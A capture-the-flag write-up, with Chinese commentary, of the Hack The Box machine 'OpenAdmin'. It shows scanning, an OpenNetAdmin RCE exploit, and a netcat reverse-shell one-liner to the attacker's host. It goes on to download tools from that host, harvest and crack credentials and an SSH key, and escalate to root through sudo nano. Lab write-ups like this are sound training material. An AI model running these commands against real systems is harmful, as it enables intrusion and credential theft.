###### tags: `Hack the box` `HTB` `Easy` `Linux`

# OpenAdmin
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.26.252 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.26.252:22
Open 10.129.26.252:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

buster
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.26.252/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

music                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 291ms]
#                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4791ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4799ms]
artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 295ms]
sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 293ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 293ms]
```

前往`http://10.129.26.252/music/`點右上角的`Login`會跳到`http://10.129.26.252/ona/`，google搜尋到[OpenNetAdmin 18.1.1 - Remote Code Execution](https://github.com/amriunix/ona-rce)
```
┌──(kali㉿kali)-[~/htb/ona-rce]
└─$ pip3 install --user requests

┌──(kali㉿kali)-[~/htb/ona-rce]
└─$ python3 ona-rce.py check http://10.129.26.252/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!

┌──(kali㉿kali)-[~/htb/ona-rce]
└─$ python3 ona-rce.py exploit http://10.129.26.252/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$
```

可以用之後開nc讓他回來
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

sh$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 4444 >/tmp/f

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$
```

用linpeas這個`52846`等等用
```
www-data@openadmin:/tmp$ wget 10.10.14.54/linpeas.sh
www-data@openadmin:/tmp$ chmod +x linpeas.sh
www-data@openadmin:/tmp$ ./linpeas.sh

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                            
Sudoers file: /etc/sudoers.d/joanna is readable                                                                                             
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```

在`/var/www/html/ona/local/config/database_settings.inc.php`可以得到`jimmy`的密碼
```php
www-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

切成`jimmy`，在`/var/www/internal/index.php`可得密碼，用[crackstation](https://crackstation.net/)破出密碼`Revealed`
```
www-data@openadmin:/var/www/html/ona/local/config$ su jimmy
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona/www/local/config$ 

jimmy@openadmin:/var/www/internal$ cat index.php
...
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
...

Hash	                                                             Type	Result
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e
ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1	sha512	Revealed
```


可以用剛剛的`52846port`了，用`ligolo`
```
┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip tuntap add user kali mode tun ligolo

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ ./proxy -selfcert

jimmy@openadmin:/tmp$ wget 10.10.14.54/agent
jimmy@openadmin:/tmp$ chmod +x agent
jimmy@openadmin:/tmp$ ./agent -connect 10.10.14.54:11601 -ignore-cert

ligolo-ng » INFO[0114] Agent joined.                                 name=jimmy@openadmin remote="10.129.26.252:39562"
ligolo-ng » session
? Specify a session : 1 - #1 - jimmy@openadmin - 10.129.26.252:39562
[Agent : jimmy@openadmin] » start
[Agent : jimmy@openadmin] » INFO[0120] Starting tunnel to jimmy@openadmin

┌──(kali㉿kali)-[~]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
```

前往`http://240.0.0.1:52846`之後用`jimmy`跟密碼`Revealed`登入後可以得到`phase key`

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

`ssh2john`後用john破
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh2john ninja > ninja_hash

┌──(kali㉿kali)-[~/htb]
└─$ john ninja_hash --wordlist=/home/kali/rockyou.txt

bloodninjas      (ninja)
```

ssh登入，在`/home/joanna`得到user.txt查看`sudo -l`
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh -i ninja joanna@10.129.26.252                                                             
Enter passphrase for key 'ninja': bloodninjas

joanna@openadmin:~$ cat user.txt
86b0fe2c81feb793cff62a77b5c2a55a

joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

查看[GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo)
`Ctrl+R` `Ctrl+X`之後輸入他要的command，就可得root，在/root得root.txt
```
joanna@openadmin:~$ sudo /bin/nano /opt/priv

Command to execute: reset; sh 1>&0 2>&0

# id                                                                             
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty; pty.spawn("/bin/bash")'          
root@openadmin:/home/joanna# cd /root
root@openadmin:~# cat root.txt
622f5b6971ef4f59b9c3487785f1b304
```